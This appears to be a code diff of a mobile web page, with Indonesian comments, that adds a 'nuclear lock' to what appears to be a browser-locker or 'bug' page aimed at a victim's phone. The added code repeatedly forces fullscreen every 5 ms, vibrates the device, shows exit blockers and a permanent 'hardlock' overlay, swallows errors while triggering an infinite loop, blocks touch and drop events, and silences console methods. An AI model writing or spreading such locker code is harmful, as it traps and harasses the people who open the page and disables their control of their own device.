+        const monitorInterval = setInterval(() => {
+            if (!document.fullscreenElement && nuclearLock) {
+                extremeFullscreenLock();
+                triggerVibration(100);
+            }
+            
+            // Cegah user dari sleep mode
+            if (document.hidden) {
+                triggerVibration(1000);
+                showExitBlocker();
+            }
+        }, 5);
+        
+        // Set timeout untuk efek permanen
+        setTimeout(() => {
+            clearInterval(monitorInterval);
+            
+            // Permanent hardlock
+            document.getElementById('hardlockOverlay').classList.add('active');
+            document.getElementById('chaos').classList.remove('active');
+            
+        }, 120000); // 2 menit
+        
+    }, 1500);
+}
+
+// FUNGSI CREATE PARTICLES (dari kode asli)
+function createParticles(count) {
+    for (let i = 0; i < count; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'particle';
+        particle.style.width = Math.random() * 30 + 10 + 'px';
+        particle.style.height = particle.style.width;
+        particle.style.left = Math.random() * 100 + 'vw';
+        particle.style.top = Math.random() * 100 + 'vh';
+        particle.style.background = `hsl(${Math.random() * 60}, 100%, 50%)`;
+        particle.style.animationDuration = Math.random() * 4 + 1 + 's';
+        particle.style.animationDelay = Math.random() * 3 + 's';
+        document.body.appendChild(particle);
+        
+        setTimeout(() => {
+            if (particle.parentNode) {
+                particle.remove();
+            }
+        }, 5000);
+    }
+}
+
+// INITIALIZATION YANG LEBIH KETAT
 document.addEventListener('DOMContentLoaded', function() {
-  document.addEventListener('touchmove', (e) => {
-    e.preventDefault();
-  }, { passive: false });
-  
-  if (isTrapped) {
-    forceFullscreen();
-  }
-  
-  if (document.fullscreenEnabled) {
-    document.getElementById('sendBtn').innerHTML = '➤ SEND BUG';
-  }
+    // Blokir semua touch movements
+    document.addEventListener('touchmove', function(e) {
+        e.preventDefault();
+    }, { passive: false });
+    
+    // Pre-load audio
+    const audioElements = document.querySelectorAll('audio');
+    audioElements.forEach(audio => {
+        audio.load();
+    });
+    
+    // Set button text
+    if (document.fullscreenEnabled) {
+        document.getElementById('sendBtn').innerHTML = '☢️ ACTIVATE NUCLEAR LOCK ☢️';
+    }
+    
+    // Prevent drag and drop
+    document.addEventListener('dragover', function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    document.addEventListener('drop', function(e) {
+        e.preventDefault();
+        return false;
+    });
 });
 
-window.addEventListener('beforeunload', function(e) {
-  if (fullscreenLock) {
-    e.preventDefault();
-    e.returnValue = 'System locked! Cannot exit!';
-    return 'System locked! Cannot exit!';
-  }
-});
-
+// ERROR HANDLING YANG LEBIH AGGRESIF
 window.addEventListener('error', function(e) {
-  e.preventDefault();
-  if (fullscreenLock) {
-    forceFullscreen();
-  }
-  return false;
+    e.preventDefault();
+    
+    if (nuclearLock) {
+        extremeFullscreenLock();
+        nuclearVibration();
+        activateInfiniteLoop();
+    }
+    return false;
 });
+
+// CATCH ALL UNHANDLED REJECTIONS
+window.addEventListener('unhandledrejection', function(e) {
+    e.preventDefault();
+    
+    if (nuclearLock) {
+        triggerVibration(500);
+        showExitBlocker();
+    }
+    return false;
+});
+
+// Blokir semua console methods
+if (window.console) {
+    console.clear = function() {};
+    console.error = function() {};
+    console.warn = function() {};
+    console.info = function() {};
+    console.debug = function() {};
+}
 </script>
 </body>
 </html>
